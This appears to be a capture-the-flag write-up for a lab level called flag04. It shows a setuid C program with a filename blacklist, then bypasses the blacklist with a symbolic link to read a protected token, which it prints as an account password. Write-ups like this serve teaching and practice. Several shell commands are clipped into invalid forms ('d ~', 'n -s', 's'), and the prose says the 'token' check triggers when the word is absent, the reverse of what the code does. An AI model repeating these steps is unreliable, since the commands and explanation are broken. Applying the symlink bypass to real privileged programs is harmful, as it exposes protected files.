Let's take a look at the source code...
````
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

So looking at the source code, it imports a parameter for a program, then runs a series of checks on it. The first check is to see if it actually has the minimum amount of arguments, and exits with an error message if not. The second checks to see if "token" is in the file name, and exits with an error message if not. The third check ensures that the file can be opened, and exits with an error message if not. Then it attempts to read the file, checks for success, and prints out the file.
Let's check to see what the contents of the challenge directory are.

```
$ cd /home/flag04
$ ls -ls
total 8
8 -rwsr-x--- 1 flag04 level04 7428 2011-11-20 21:52 flag04  
1 -rw------- 1 flag04 flag04    37 2011-11-20 21:52 token
```

So looking at this, we have the elf that we just saw the source code for and the token file that we are supposed to read. However the token filename should have the program output an error. This woulnd't be too much of an issue since we could just rename or copy the file, however looking att he permissions we don't have any read permissions for that. The program does since it is configured to run as a different user, however the filename should cause an error.

```
/home/flag04/flag04
./flag04 [file to read]
./flag04 token
You may not access 'token'
```

So the program behaved as expected. However we should be able to create a symbolic link that does not have "token" in the name, and pass that as an argument to the program. The program would be privleged enoug to read it, and it shouldn't fail any of the checks.

```
$ d ~
$ n -s /home/flag04/token Token
$ s
Token
$ home/flag04/flag04 ~/Token
06508b5e-8909-4f38-b630-fdb148a84a2
```

The stirng that it gives you is the password to the flag04 account. You can log into that account and run getflag
